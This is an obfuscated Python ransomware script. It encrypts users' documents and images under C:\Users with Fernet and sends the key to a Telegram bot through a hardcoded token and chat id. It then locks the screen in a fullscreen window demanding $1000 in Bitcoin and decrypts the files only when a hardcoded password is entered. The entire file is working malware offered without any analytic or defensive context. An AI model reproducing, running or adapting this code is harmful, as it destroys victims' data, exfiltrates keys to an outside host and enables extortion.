lllllllllllllll, llllllllllllllI, lllllllllllllIl = bool, __name__, open

from os import walk as IllllIIIIllllI
from os.path import join as IIllIlIllIllll
from tkinter import Tk as llIlIIllIlllll, Entry as lIlIIIIIIIIIIl, Button as IIIIllllIlIIII
from requests import post as lllIIIIIIlIlII
from cryptography.fernet import Fernet as lIlIlllllIllIl
from tkinter import messagebox as IIIllIIIlllIIl
llIIlIlllIlIllIlll = '7195166168:AAF9U6r_9sm_8SjoXbFn6LvxvHKDXYWWvTK'
lIIlllIIIlIlllIlll = '6088440786'
lllIIIlIIIIlllIlII = lIlIlllllIllIl.generate_key()
IlIIIIlIIIIlllIIlI = lIlIlllllIllIl(lllIIIlIIIIlllIlII)
IIlllIlIllIllllIIl = 'techarise'

def llIIllIlIllIllIIII():
    for (IlIIlIllllIllIIIlI, IIlIllllIIIIlllIII, IllIlIIlllIlllIIIl) in IllllIIIIllllI('C:\\Users'):
        for lIIlllllIlIIIIIIIl in IllIlIIlllIlllIIIl:
            if lIIlllllIlIIIIIIIl.endswith(('.txt', '.docx', '.jpg', '.png')):
                IIllIIlIIIIIIlIIll = IIllIlIllIllll(IlIIlIllllIllIIIlI, lIIlllllIlIIIIIIIl)
                try:
                    with lllllllllllllIl(IIllIIlIIIIIIlIIll, 'rb') as IIlIlIIlIlllIIlIlI:
                        lIIllllIIlIIlIlIll = IIlIlIIlIlllIIlIlI.read()
                    llIlllIIlIlIlIIIll = IlIIIIlIIIIlllIIlI.encrypt(lIIllllIIlIIlIlIll)
                    with lllllllllllllIl(IIllIIlIIIIIIlIIll, 'wb') as IIlIlIIlIlllIIlIlI:
                        IIlIlIIlIlllIIlIlI.write(llIlllIIlIlIlIIIll)
                except:
                    pass

def IllIIlIIllIlllllIl():
    IlIIlIllllIllIIIlI = llIlIIllIlllll()
    IlIIlIllllIllIIIlI.attributes('-fullscreen', lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
    IIIllIIIlllIIl.showerror('HACKED', 'YOU HAVE BEEN HACKED! PAY ME$1000 BTC to unlock. Enter password:')
    IIlIIlIlIllIIIlIII = lIlIIIIIIIIIIl(IlIIlIllllIllIIIlI, show='*')
    IIlIIlIlIllIIIlIII.pack()

    def llIllllIllIllllIIl():
        if IIlIIlIlIllIIIlIII.get() == IIlllIlIllIllllIIl:
            lIIllIIIlIIlIIIIIl()
            IIIllIIIlllIIl.showinfo('Success', 'Files decrypted!')
            IlIIlIllllIllIIIlI.destroy()
        else:
            IIIllIIIlllIIl.showerror('Wrong', 'Invalid password. Pay up!')
    IIIIllllIlIIII(IlIIlIllllIllIIIlI, text='Submit', command=llIllllIllIllllIIl).pack()
    IlIIlIllllIllIIIlI.mainloop()

def lIIllIIIlIIlIIIIIl():
    for (IlIIlIllllIllIIIlI, IIlIllllIIIIlllIII, IllIlIIlllIlllIIIl) in IllllIIIIllllI('C:\\Users'):
        for lIIlllllIlIIIIIIIl in IllIlIIlllIlllIIIl:
            if lIIlllllIlIIIIIIIl.endswith(('.txt', '.docx', '.jpg', '.png')):
                IIllIIlIIIIIIlIIll = IIllIlIllIllll(IlIIlIllllIllIIIlI, lIIlllllIlIIIIIIIl)
                try:
                    with lllllllllllllIl(IIllIIlIIIIIIlIIll, 'rb') as IIlIlIIlIlllIIlIlI:
                        lIIllllIIlIIlIlIll = IIlIlIIlIlllIIlIlI.read()
                    IllIlIIlllllllllII = IlIIIIlIIIIlllIIlI.decrypt(lIIllllIIlIIlIlIll)
                    with lllllllllllllIl(IIllIIlIIIIIIlIIll, 'wb') as IIlIlIIlIlllIIlIlI:
                        IIlIlIIlIlllIIlIlI.write(IllIlIIlllllllllII)
                except:
                    pass

def IIlIIIlIllllIIIlIl():
    lllIIIIIIlIlII(f'https://api.telegram.org/bot{llIIlIlllIlIllIlll}/sendMessage', data={'chat_id': lIIlllIIIlIlllIlll, 'text': f'Encryption key: {lllIIIlIIIIlllIlII.decode()}'})
if llllllllllllllI == '__main__':
    llIIllIlIllIllIIII()
    IIlIIIlIllllIIIlIl()
    IllIIlIIllIlllllIl()